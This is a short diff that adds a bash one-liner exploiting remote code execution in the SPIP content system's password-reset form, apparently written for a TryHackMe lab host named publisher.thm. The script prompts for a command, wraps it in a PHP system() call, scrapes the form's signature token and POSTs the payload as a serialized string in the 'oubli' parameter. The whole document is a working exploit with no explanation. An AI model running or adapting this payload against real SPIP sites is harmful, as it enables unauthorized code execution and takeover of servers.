@@ -1,0 +1,8 @@
+if echo $SHELL | grep zsh > /dev/null ; then read 'cmd?Enter a command for RCE: '; else read -p 'Enter a command for RCE: ' ; fi \
+&& php_rce="<?php echo system('echo; echo; echo; ${cmd}; echo; echo; echo;'); ?>" \
+&& cmd_length=$(echo $php_rce | tr -d '\n' | wc -m) \
+&& curl -s -X POST http://publisher.thm/spip/spip.php?page=spip_pass \
+-d "page=spip_pass" \
+-d "formulaire_action=oubli" \
+-d "formulaire_action_args=$(curl -s http://publisher.thm/spip/spip.php?page=spip_pass | grep -i formulaire_action_sign | cut -d "'" -f 2)" \
+-d "oubli=s:${cmd_length}:\"${php_rce}\";"
